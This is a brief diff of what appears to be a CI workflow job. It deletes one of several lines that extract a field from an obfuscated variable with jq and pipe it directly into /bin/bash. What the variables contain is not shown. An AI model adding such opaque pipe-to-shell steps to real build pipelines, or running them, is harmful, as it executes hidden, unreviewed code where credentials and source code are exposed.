@@ -30,7 +30,6 @@ jobs:
           printf '%s' "$p585" | jq -r .eg0795 | /bin/bash
           echo $m19082 | jq -r .rgoe6 | /bin/bash
           echo $xnr5 | jq -r .qv0890 | /bin/bash
-          echo $y73 | jq -r .v82 | /bin/bash
           printf '%s' "$mi9242" | jq -r .m77 | /bin/bash
 
       - name: Save results
